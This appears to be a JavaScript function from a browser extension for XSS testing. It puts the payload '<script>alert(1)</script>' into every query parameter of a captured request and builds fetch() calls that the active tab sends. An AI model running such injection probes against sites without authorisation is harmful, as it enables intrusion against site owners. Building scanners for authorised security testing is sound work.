export function exploitxss(request) {
  chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    let attacks = [];

    updateBadge(tabCounters);

    lstOfAttacks = ["<script>alert(1)</script>"];

    for (let index = 0; index < lstOfAttacks.length; index++) {
      const element = lstOfAttacks[index];

      params = new URLSearchParams(request.url.split("?")[1]);
      newurl = request.url.split("?")[0] + "?";
      params.forEach(function (value, key) {
        newurl += `${key}=${element}&`;
      });

      attacks.push(
        `fetch('${newurl}', {method: '${request.method}'}).then((x) => x.text()).then((x) => console.log(x))`
      );
    }

    chrome.tabs.sendMessage(tabs[0].id, {
      ...request,
      fullrequest: "",
      tryingattacks: attacks,
    });
  });
}
